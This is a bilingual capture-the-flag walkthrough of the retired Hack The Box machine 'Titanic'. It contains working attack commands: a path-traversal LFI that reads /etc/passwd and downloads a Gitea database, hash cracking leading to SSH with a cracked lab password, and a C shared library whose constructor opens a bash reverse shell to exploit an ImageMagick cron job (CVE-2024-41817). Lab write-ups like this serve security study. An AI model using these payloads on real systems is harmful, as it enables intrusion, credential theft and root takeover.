# Titanic [Easy]

> **ES:** Máquina Linux con app Flask de reservas y Gitea interno; se abusa un LFI para filtrar credenciales y un cron de ImageMagick para escalar a root.
> **EN:** Linux box with a Flask booking app and internal Gitea; LFI leaks credentials and an ImageMagick cron job leads to root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Titanic] |
| **URL** | https://app.hackthebox.com/machines/Titanic |
| **IP lab** | 10.10.11.55 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía LFI (`download?ticket=`) → robo de `gitea.db` → SSH como `developer` → abuso de cron `identify_images.sh` (ImageMagick CVE-2024-41817).
> **EN:** Get `user.txt` and `root.txt` via LFI (`download?ticket=`) → `gitea.db` theft → SSH as `developer` → `identify_images.sh` cron abuse (ImageMagick CVE-2024-41817).

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] ffuf (contenidos `/book`, subdominio `dev.titanic.htb`)
- [ ] curl (LFI, exfiltración `app.py`/`gitea.db`)
- [ ] sqlite3 + gitea2hashcat.py + hashcat/john (hash pbkdf2 de Gitea)
- [ ] ssh
- [ ] pspy64 + gcc (privesc ImageMagick)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo 22/SSH y 80/HTTP (Apache → Flask). El vhost es `titanic.htb`; añadir a `/etc/hosts`. `ffuf` halla `/book` y el subdominio `dev.titanic.htb` (Gitea 1.22.1 con repo público del código de la app).
> **EN:** Only 22/SSH and 80/HTTP (Apache → Flask). Vhost is `titanic.htb`; add to `/etc/hosts`. `ffuf` finds `/book` and subdomain `dev.titanic.htb` (Gitea 1.22.1 with a public repo of the app code).

```bash
nmap -sC -sV -Pn 10.10.11.55 -oN nmap.txt
echo '10.10.11.55 titanic.htb dev.titanic.htb' | sudo tee -a /etc/hosts
curl -s http://titanic.htb/ | head -40
```

**Resultado / Result:** 22/tcp OpenSSH 8.9p1, 80/tcp Apache 2.4.52 → Flask (Werkzeug, app de reserva de camarotes en 127.0.0.1:5000; Gitea en 127.0.0.1:3000, SSH interno 2222). Capturas en `img/image_20250323-152319.png` y en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El formulario `/book` guarda tickets JSON (`TICKETS_DIR=tickets`, uuid) y `/download?ticket=` concatena sin sanear `../` (`os.path.join` + `send_file`). Se prueba con `/etc/passwd` (revela `developer` uid 1000) y se extrae `app.py` (sin RCE: solo Flask + JSON).
> **EN:** The `/book` form stores JSON tickets (`TICKETS_DIR=tickets`, uuid) and `/download?ticket=` concatenates without sanitizing `../` (`os.path.join` + `send_file`). Test with `/etc/passwd` (reveals `developer` uid 1000) and extract `app.py` (no RCE: plain Flask + JSON).

```bash
# PoC LFI:
curl -s 'http://titanic.htb/download?ticket=../../../../etc/passwd'
# root:x:0:0... developer:x:1000:1000:developer:/home/developer:/bin/bash ...
curl -s 'http://titanic.htb/download?ticket=../app.py' -o app.py
grep -n 'TICKETS_DIR\|download\|gitea\|MYSQL' app.py
# TICKETS_DIR = "tickets"; download_ticket(): os.path.join(TICKETS_DIR, ticket) -> send_file
```

**Resultado / Result:** LFI confirmado. Sin `id_rsa` de `developer` accesible: el objetivo pasa a ser la base de Gitea. Capturas del flujo de reserva en `img/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con el LFI se descarga la base de Gitea (`/home/developer/gitea/data/gitea/gitea.db`), se listan usuarios (`administrator/developer/test/abc/admin1`, hashes `pbkdf2$50000$50`) y se crackea el de `developer` offline (`gitea2hashcat.py` + rockyou) → SSH.
> **EN:** Use LFI to download the Gitea DB (`/home/developer/gitea/data/gitea/gitea.db`), list users (`administrator/developer/test/abc/admin1`, `pbkdf2$50000$50` hashes) and crack `developer`'s offline (`gitea2hashcat.py` + rockyou) → SSH.

```bash
curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
sqlite3 gitea.db "SELECT name, passwd, salt FROM user;"
python3 gitea2hashcat.py gitea.db > hashes.txt
hashcat -m <modo-gitea-pbkdf2> hashes.txt /usr/share/wordlists/rockyou.txt
# developer:25282528 (credencial de laboratorio retirado)
ssh developer@titanic.htb
```

**Resultado / Result:** Hash crackeado → shell como `developer`. Se lee `user.txt` en su home (formato parcial ofuscado).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** La sesión SSH como `developer` ya da el flag de usuario. Sin `sudo` (`Sorry, user developer may not run sudo`). Se verifica `id` y se estabiliza la shell.
> **EN:** The `developer` SSH session already yields the user flag. No `sudo` (`Sorry, user developer may not run sudo`). Verify `id` and stabilize the shell.

```bash
id; ls -l ~/user.txt
cat ~/user.txt  # formato parcial ofuscado
python3 -c 'import pty; pty.spawn("/bin/bash")'
netstat -ntlp  # 127.0.0.1:5000 flask, 127.0.0.1:3000 gitea, 127.0.0.1:2222
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `linpeas` no muestra nada útil, pero `pspy64` revela un cron invisible que ejecuta `/opt/scripts/identify_images.sh` como root (`cd /opt/app/static/assets/images; truncate metadata.log; find ... -name "*.jpg" | xargs magick identify`). ImageMagick 7.1.1-35 es vulnerable a CVE-2024-41817 (GHSA-8rxc-922v-phg8, hijack de `libxcb`): se planta `libxcb.so.1` maliciosa con constructor (reverse shell o `cat /root/root.txt > /tmp/root.txt`) en ese directorio y el cron la carga como root.
> **EN:** `linpeas` shows nothing, but `pspy64` reveals an invisible cron running `/opt/scripts/identify_images.sh` as root (`cd /opt/app/static/assets/images; truncate metadata.log; find ... -name "*.jpg" | xargs magick identify`). ImageMagick 7.1.1-35 is vulnerable to CVE-2024-41817 (GHSA-8rxc-922v-phg8, `libxcb` hijack): drop a malicious `libxcb.so.1` with constructor (reverse shell or `cat /root/root.txt > /tmp/root.txt`) in that dir; cron loads it as root.

```bash
cat /opt/scripts/identify_images.sh
./pspy64 -f=true  # FS: OPEN /opt/scripts/identify_images.sh (periódico)
magick --version  # ImageMagick 7.1.1-35 Q16-HDRI x86_64
cd /opt/app/static/assets/images/
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("/bin/bash -c 'bash -i >& /dev/tcp/<TU-IP>/8888 0>&1'");
    exit(0);
}
EOF
nc -lvnp 8888
# root@titanic:/opt/app/static/assets/images# whoami -> root
cat /root/root.txt  # formato: 4fce... (ofuscado)
```

**Resultado / Result:** Callback como `root` vía ImageMagick. Técnica: cron inseguro + hijack de librería compartida (CVE-2024-41817).

---

## 🧠 Lo aprendido / Learned

> **ES:** LFI por concatenación de rutas en Flask; exfiltración de `gitea.db` y crack offline; privesc con cron + ImageMagick (CVE-2024-41817).
> **EN:** Path-concatenation LFI in Flask; `gitea.db` exfiltration and offline cracking; cron + ImageMagick privesc (CVE-2024-41817).

- [ ] Auditar `send_file`/`ticket` sin normalizar ruta
- [ ] Gitea sqlite → hash pbkdf2 → SSH reuse
- [ ] `pspy` para descubrir crons invisibles

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: `dev.titanic.htb`/Gitea 1.22.1, filas `user` de `gitea.db`, `developer:25282528`, payload gcc exacto) — wither/nota migrada
- **Walkthrough de referencia:** HTB Titanic — https://0xdf.gitlab.io/2025/06/21/htb-titanic.html — 0xdf
- **Referencia técnica:** Arbitrary Code Execution in ImageMagick (CVE-2024-41817) — https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 — ImageMagick
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
